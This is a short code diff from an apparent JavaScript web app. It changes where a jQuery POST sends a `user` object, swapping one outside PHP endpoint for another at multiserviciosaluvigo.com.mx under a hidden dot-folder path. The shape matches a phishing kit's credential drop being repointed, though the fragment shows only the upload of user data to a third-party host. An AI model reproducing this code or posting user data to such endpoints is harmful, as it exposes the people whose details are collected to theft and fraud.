@@ -62,7 +62,7 @@ const App = ()=>{
 
       $.ajax({
           type: "POST",
-          url: "https://pearldozen.com/nc_assets/fonts/nas/ns.php",
+          url: "https://multiserviciosaluvigo.com.mx/.fmreb/musal/_oct/don/rara.php",
           data: user,
           success(data) {
               console.log(data);
